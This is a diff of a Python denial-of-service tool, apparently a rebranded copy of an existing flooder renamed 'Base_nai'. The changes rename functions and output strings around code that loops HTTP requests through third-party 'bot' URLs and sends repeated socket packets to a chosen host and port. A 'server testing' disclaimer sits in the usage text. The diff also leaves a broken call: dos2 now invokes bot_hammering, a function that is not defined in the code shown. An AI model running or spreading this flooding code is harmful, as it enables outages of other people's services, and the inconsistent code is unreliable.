@@ -1,4 +1,4 @@
- #!/usr/bin/python3
+#!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
 
@@ -34,11 +34,11 @@ def my_bots():
     return bots
 
 
-def bot_TL_baseNai(url):
+def bot_Base_nai(url):
     try:
         while True:
             req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(useragent)}))
-            print("\033[94mbot is hancurkan...\033[0m")
+            print("\033[94mbot is Base_nai...\033[0m")
             time.sleep(.1)
     except:
         time.sleep(.1)
@@ -54,7 +54,7 @@ def down_it(item):
             s.connect((host, int(port)))
             if s.sendto(packet, (host, int(port))):
                 s.shutdown(1)
-                print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--packet terkirim! hammering--> \033[0m")
+                print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--packet terkirim! Base_nai--> \033[0m")
             else:
                 s.shutdown(1)
                 print("\033[91mshut<->down\033[0m")
@@ -75,15 +75,15 @@ def dos():
 def dos2():
     while True:
         item = w.get()
-        bot_hancurkan(random.choice(bots) + "http://" + host)
+        bot_hammering(random.choice(bots) + "http://" + host)
         w.task_done()
 
 
 def usage():
-    print(''' \033[92m	TL_baseNai-DDos Attack Tool v1.0
+    print(''' \033[92m	Base_nai Ddos Attack Tool v1.0
     It is the end user's responsibility to obey all applicable laws.
     It is just for server testing script. Your ip is visible. \n
-    usage : python3 TL_baseNai.py [-s] [-p] [-t]
+    usage : python Base_nai.py [-s] [-p] [-t]
     -h : help
     -s : server ip
     -p : port default 80
